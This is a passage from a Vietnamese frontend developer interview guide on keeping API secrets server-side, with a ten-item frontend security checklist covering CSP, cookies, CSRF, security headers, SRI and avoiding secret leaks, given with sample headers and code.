app.post('/api/payments', async (req,res)=>{
  const intent = await stripe.paymentIntents.create({ amount: req.body.amount, currency: 'usd' });
  res.json({ clientSecret: intent.client_secret }); // chỉ trả client_secret (public)
});

// ✅ Nếu buộc có key ở frontend (ví dụ Mapbox), restrict:
// - HTTP referrer restriction (chỉ shop.com được dùng)
// - Rate limit, quota
// - Dùng backend proxy để ẩn key
// .env
// NEXT_PUBLIC_MAPBOX_TOKEN=pk_xxx (public, restrict domain)
// MAPBOX_SECRET=sk_xxx (chỉ server)

// Vite/Next env
// VITE_API_URL - public, ok
// VITE_SECRET - ❌ vẫn public, đừng đặt
// Chỉ biến không có prefix VITE_/NEXT_PUBLIC_ mới chỉ server đọc
```

| Loại | Có nên ở frontend? | Ví dụ |
|---|---|---|
| Public publishable | Có, restrict domain | `pk_live_`, `NEXT_PUBLIC_API_URL` |
| Secret | Không bao giờ | `sk_live_`, `DB_PASSWORD`, `client_secret` |
| Env frontend | Public | `VITE_`, `NEXT_PUBLIC_` → bundle |

**Trade-off:** Proxy qua backend thêm latency, nhưng an toàn. Nếu key public mà bị abuse quota, vẫn tốn tiền, nên restrict IP/referrer và rate limit.

**Câu hỏi đào sâu:** `NEXT_PUBLIC_` khác biến server-only thế nào trong Next.js? Làm sao restrict API key theo domain?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 134: Checklist bảo mật Frontend toàn diện

**Trả lời Senior:**
Ship feature xong chưa đủ, Senior có checklist 10 mục trước khi merge:

1.  **XSS**: không `innerHTML`/`dangerouslySetInnerHTML` với user input, `textContent` + `DOMPurify` nếu cần HTML, React auto-escape.
2.  **Cookie**: `HttpOnly; Secure; SameSite=Lax` cho session/refresh, không lưu JWT trong `localStorage` nếu có thể.
3.  **CSRF**: `SameSite` + `CSRF Token` header + check `Origin` cho POST/PUT/DELETE.
4.  **CSP**: `default-src 'self'; script-src 'nonce-...'; frame-ancestors 'none'` + report-uri.
5.  **Auth**: access ngắn (15p) memory + refresh httpOnly rotation, PKCE cho OAuth2, không lưu secret ở frontend.
6.  **Redirect**: validate `next` param, chỉ relative hoặc whitelist, chống open redirect.
7.  **Frame**: `X-Frame-Options: DENY` + `frame-ancestors 'none'` chống clickjacking.
8.  **Dependency**: `npm audit`, `Snyk`, `Dependabot`, pin version, SRI cho CDN (`integrity="sha256-..."`).
9.  **Headers**: `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy`.
10. **Leak**: không log token, không commit `.env`, scan bundle có `sk_`, `secret`, `password`, dùng `report-uri` để phát hiện CSP bypass.

```http
# Headers mẫu cho production
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xxx' https://cdn.example.com; style-src 'self' 'nonce-xxx'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

```javascript
// SRI cho CDN
<script src="https://cdn.example.com/lib.js" integrity="sha384-oqVu... " crossorigin="anonymous"></script>

// Không log secret
console.log('user', user); // ❌ nếu user chứa token
console.log('user', { id: user.id, email: user.email }); // ✅

// Scan env leak trong CI
// .github/workflows/security.yml: npm audit --audit-level=high; npx snyk test
```

**Trade-off:** Checklist nhiều làm chậm release, nhưng 1 breach tốn hơn 100 lần. Tự động hóa bằng linter (`eslint-plugin-security`), header middleware, và CSP report.

**Câu hỏi đào sâu:** `X-Content-Type-Options: nosniff` chặn gì? `Permissions-Policy` để làm gì? Làm sao tự động check bundle có leak secret?

[↑ Quay lại Mục lục](#mục-lục)
---
